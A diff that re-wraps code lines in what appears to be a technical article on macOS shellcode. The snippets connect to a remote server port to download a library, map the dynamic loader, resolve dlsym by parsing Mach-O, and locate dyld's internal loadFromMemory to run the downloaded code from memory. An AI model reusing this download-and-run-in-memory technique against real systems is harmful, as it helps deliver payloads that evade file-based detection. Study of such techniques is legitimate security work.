@@ -35,7 +35,8 @@ First, we connect to the port and download the library:
     serv_addr.sin_port = htons(SERVER_PORT);
 
     // Connect to the remote host.
-    if(scc_connect(sockfd,(struct sockaddr *)&serv_addr,sizeof(serv_addr)) < 0) {
+    if(scc_connect(sockfd,(struct sockaddr *)&serv_addr,
+                   sizeof(serv_addr)) < 0) {
         // If not, clean up and bail.
         scc_exit(44);
     }
@@ -47,7 +48,8 @@ Next, we load the dynamic loader:
 
 ```c
     int dyld_fd = scc_open("/usr/lib/dyld", O_RDONLY, 0);
-    void* dyld_buf = scc_mmap(NULL, mem_size, PROT_READ, MAP_PRIVATE, dyld_fd, 0);
+    void* dyld_buf = scc_mmap(NULL, mem_size, PROT_READ, 
+                              MAP_PRIVATE, dyld_fd, 0);
 ```
 
 This step is a bit wasteful because the process would've likely already had the dynamic loader mapped in memory. However, we are in shell code and it is a lot easier to map the file than to find the existing location.
@@ -56,7 +58,8 @@ Then, we find the symbol `dlsym` which will help us find other symbols in the pr
 
 ```c
     typedef void* (*dlsym_t)(void* handle, const char* symbol);
-    dlsym_t dlsym = (dlsym_t)findSymbol64(dyld_buf, mem_size, "_dlsym", 6);
+    dlsym_t dlsym = (dlsym_t)findSymbol64(dyld_buf, mem_size, 
+                                          "_dlsym", 6);
 ```
 
 The `findSymbol64` exists in the shellcode and it parses the Mach-O file of `dyld` to locate the function.
@@ -76,7 +79,8 @@ Then we locate the `loadFromMemory` function or, rather, a C++ class constructor
 The [__ZN4dyld14loadFromMemoryEPKhyPKc](https://opensource.apple.com/source/dyld/dyld-353.2.1/src/dyld.cpp) function was discovered by analyzing the dyld source code for how it loads Mach-O's into memory. This function will construct a class in memory to internally describe the layout and all the features that the system cares about.
 
 ```c++
-ImageLoader* loadFromMemory(const uint8_t* mem, uint64_t len, const char* moduleName)
+ImageLoader* loadFromMemory(const uint8_t* mem, uint64_t len, 
+                            const char* moduleName)
 {
     // if fat wrapper, find usable sub-file
     const fat_header* memStartAsFat = (fat_header*)mem;
